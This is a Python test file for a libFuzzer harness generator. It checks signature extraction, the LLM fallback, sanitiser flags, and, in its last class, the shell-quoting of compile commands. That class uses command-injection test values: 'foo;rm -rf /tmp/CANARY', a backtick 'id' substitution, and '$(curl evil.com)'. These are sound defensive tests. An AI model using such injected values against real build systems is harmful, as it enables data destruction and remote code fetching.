"""Tests for the libFuzzer harness generator."""

import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock

from packages.fuzzing.harness_generator import (
    HarnessGenerator,
    HarnessSpec,
    GeneratedHarness,
    _extract_target_signature,
)


class TestExtractTargetSignature(unittest.TestCase):
    def test_simple_signature(self):
        header = """\
#ifndef PARSER_H
#define PARSER_H
int parse_buffer(const char *data, size_t len);
void other_fn(void);
#endif
"""
        sig = _extract_target_signature(header, "parse_buffer")
        self.assertIsNotNone(sig)
        self.assertIn("parse_buffer", sig)

    def test_no_match_returns_none(self):
        header = "int other(void);"
        self.assertIsNone(_extract_target_signature(header, "missing"))

    def test_only_matches_function_name_not_substring(self):
        header = "int parse(void); int parse_full(int x);"
        sig = _extract_target_signature(header, "parse")
        self.assertIsNotNone(sig)
        self.assertIn("parse(", sig)


class TestHarnessGenerator(unittest.TestCase):
    def test_no_llm_returns_fallback(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".h", delete=False) as f:
            f.write("int parse_buf(const uint8_t *p, size_t n);\n")
            header = Path(f.name)
        try:
            spec = HarnessSpec(target_function="parse_buf", header_path=header)
            gen = HarnessGenerator(llm=None)
            harness = gen.generate(spec)
            self.assertIsInstance(harness, GeneratedHarness)
            self.assertIn("LLVMFuzzerTestOneInput", harness.source_code)
            self.assertIn("parse_buf", harness.source_code)
            self.assertIn("Fallback", harness.rationale)
        finally:
            header.unlink()

    def test_llm_success_path(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".h", delete=False) as f:
            f.write("int parse_buf(const uint8_t *p, size_t n);\n")
            header = Path(f.name)
        try:
            mock_llm = MagicMock()
            mock_llm.generate_structured.return_value = (
                {
                    "source_code": (
                        "#include <stdint.h>\n#include <stddef.h>\n"
                        "extern int parse_buf(const uint8_t*, size_t);\n"
                        "int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n"
                        "    parse_buf(data, size);\n"
                        "    return 0;\n"
                        "}\n"
                    ),
                    "language": "c",
                    "rationale": "Direct byte passthrough; signature matches.",
                },
                {},
            )

            spec = HarnessSpec(target_function="parse_buf", header_path=header)
            gen = HarnessGenerator(llm=mock_llm)
            harness = gen.generate(spec)
            self.assertEqual(harness.language, "c")
            self.assertIn("LLVMFuzzerTestOneInput", harness.source_code)
            self.assertEqual(harness.target_function, "parse_buf")
        finally:
            header.unlink()

    def test_llm_returns_no_source_falls_back(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".h", delete=False) as f:
            f.write("int x(void);\n")
            header = Path(f.name)
        try:
            mock_llm = MagicMock()
            mock_llm.generate_structured.return_value = ({}, {})

            spec = HarnessSpec(target_function="x", header_path=header)
            gen = HarnessGenerator(llm=mock_llm)
            harness = gen.generate(spec)
            # Should fall back, not crash
            self.assertIn("LLVMFuzzerTestOneInput", harness.source_code)
            self.assertIn("fallback", harness.rationale.lower())
        finally:
            header.unlink()

    def test_compile_command_includes_sanitisers(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".h", delete=False) as f:
            f.write("int x(void);\n")
            header = Path(f.name)
        try:
            spec = HarnessSpec(
                target_function="x", header_path=header,
                library_name="mylib", include_paths=["/usr/include/mylib"],
            )
            gen = HarnessGenerator(llm=None)
            harness = gen.generate(spec)
            self.assertIn("-fsanitize=fuzzer", harness.compile_command)
            self.assertIn("address", harness.compile_command)
            self.assertIn("/usr/include/mylib", harness.compile_command)
            self.assertIn("-lmylib", harness.compile_command)
        finally:
            header.unlink()

    def test_write_creates_source_and_build_script(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".h", delete=False) as f:
            f.write("int x(void);\n")
            header = Path(f.name)
        try:
            spec = HarnessSpec(target_function="x", header_path=header)
            gen = HarnessGenerator(llm=None)
            harness = gen.generate(spec)
            with tempfile.TemporaryDirectory() as tmp:
                target_path = gen.write(harness, Path(tmp))
                self.assertTrue(target_path.exists())
                build_script = Path(tmp) / "build_x.sh"
                self.assertTrue(build_script.exists())
                self.assertTrue(build_script.stat().st_mode & 0o111)
        finally:
            header.unlink()

    def test_missing_header_raises(self):
        with self.assertRaises(FileNotFoundError):
            HarnessSpec(
                target_function="x",
                header_path=Path("/nonexistent/raptor_probe.h"),
            )


class TestCompileCommandShellSafety(unittest.TestCase):
    """compile_command is stored as a str on GeneratedHarness and
    consumed by operators who often `sh -c` it or paste into a build
    script. Attacker-influenced fields (target binary symbol names,
    include paths parsed from binary metadata, library names from
    header inspection) MUST be shlex-quoted to prevent command
    injection. Per PR #488 review."""

    def _make_header(self, body: str = "int foo(void);\n") -> Path:
        f = tempfile.NamedTemporaryFile(
            suffix=".h", delete=False, prefix="r2-cmdq-",
        )
        f.write(body.encode())
        f.close()
        self.addCleanup(lambda p=f.name: Path(p).unlink(missing_ok=True))
        return Path(f.name)

    def test_semicolon_in_target_function_quoted(self):
        """A target binary that exposes a function literally named
        `foo;rm -rf /tmp/CANARY` (or any shell-meta-containing symbol)
        must not result in a compile_command shell can split into
        multiple commands. Re-tokenisation via shlex.split should
        produce the entire malicious payload as a SINGLE output-name
        token."""
        import shlex as _shlex
        header = self._make_header()
        spec = HarnessSpec(
            target_function="foo;rm -rf /tmp/CANARY",
            header_path=header,
            include_paths=[],
            library_name=None,
        )
        gen = HarnessGenerator(llm=None)
        harness = gen.generate(spec)
        cmd = harness.compile_command
        tokens = _shlex.split(cmd)
        o_idx = tokens.index("-o")
        output_name = tokens[o_idx + 1]
        self.assertIn("rm -rf /tmp/CANARY", output_name,
                      msg=f"shell could split this: {cmd!r}")

    def test_backtick_in_library_name_quoted(self):
        """Library names parsed from binary metadata could contain
        backticks (command substitution). Must survive shell parsing
        as a single token."""
        import shlex as _shlex
        header = self._make_header()
        spec = HarnessSpec(
            target_function="foo",
            header_path=header,
            include_paths=[],
            library_name="mylib`id`",
        )
        gen = HarnessGenerator(llm=None)
        harness = gen.generate(spec)
        tokens = _shlex.split(harness.compile_command)
        self.assertIn("-lmylib`id`", tokens, msg=(
            f"library_name not quoted — backtick substitution possible: "
            f"{harness.compile_command!r}"
        ))

    def test_dollar_in_include_path_quoted(self):
        """Include paths from binary-metadata extraction could contain
        `$(...)` command substitution. Must survive shell parsing."""
        import shlex as _shlex
        header = self._make_header()
        spec = HarnessSpec(
            target_function="foo",
            header_path=header,
            include_paths=["/tmp/$(curl evil.com)/include"],
            library_name=None,
        )
        gen = HarnessGenerator(llm=None)
        harness = gen.generate(spec)
        tokens = _shlex.split(harness.compile_command)
        i_tokens = [t for t in tokens if t.startswith("-I")]
        self.assertEqual(len(i_tokens), 1)
        self.assertIn("$(curl evil.com)", i_tokens[0], msg=(
            f"include path not quoted: {harness.compile_command!r}"
        ))

    def test_benign_input_unchanged_by_quoting(self):
        """shlex.quote is a no-op on shell-safe strings. Operator-
        readable output should still look natural for typical input."""
        header = self._make_header()
        spec = HarnessSpec(
            target_function="parse_message",
            header_path=header,
            include_paths=["/usr/include/mylib"],
            library_name="mylib",
        )
        gen = HarnessGenerator(llm=None)
        harness = gen.generate(spec)
        cmd = harness.compile_command
        # No spurious single-quotes around benign strings — operator
        # eyeballing the command sees the same shape they would
        # pre-quote.
        self.assertIn("-I/usr/include/mylib", cmd)
        self.assertIn("-lmylib", cmd)
        self.assertIn("-o fuzz_parse_message", cmd)


if __name__ == "__main__":
    unittest.main()
